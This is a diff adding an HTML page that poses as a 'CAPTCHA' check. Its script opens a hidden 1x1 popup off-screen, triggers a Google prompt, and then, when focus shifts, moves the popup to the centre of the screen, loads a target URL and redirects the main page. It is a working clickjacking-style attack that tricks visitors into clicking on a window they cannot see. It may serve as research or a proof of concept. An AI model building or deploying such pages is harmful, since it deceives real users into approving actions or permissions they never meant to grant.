@@ -1,0 +1,33 @@
+<meta charset="UTF-8" />
+<link rel="stylesheet" href="style.css" />
+<script src="utils.js"></script>
+<div id="google"></div>
+<body>
+  <h1>CAPTCHA</h1>
+  <p>We ask you to complete a small task to verify you are not a robot.</p>
+  <button>Okay</button>
+  <script>
+    let w;
+    const interval = setInterval(async () => {
+      if (navigator.userActivation.isActive) {
+        if (!w || w.closed) {
+          w = window.open(blankBlob(), "popup", "width=1,height=1,left=9999,top=9999");
+          await waitForWindow(w);
+          w.resizeTo(1, 1);
+          w.moveTo(9999, 9999);
+        }
+        googlePrompt();
+        w.onblur = () => {
+          const width = 1200;
+          const height = 280;
+          const x = window.innerWidth / 2 + window.screenX - width / 2;
+          const y = window.innerHeight / 2 + window.screenY - height / 2;
+          w.moveTo(x, y);
+          w.resizeTo(width, height);
+          w.location = url;
+          location = "/drag.html";
+        };
+      }
+    }, 100);
+  </script>
+</body>
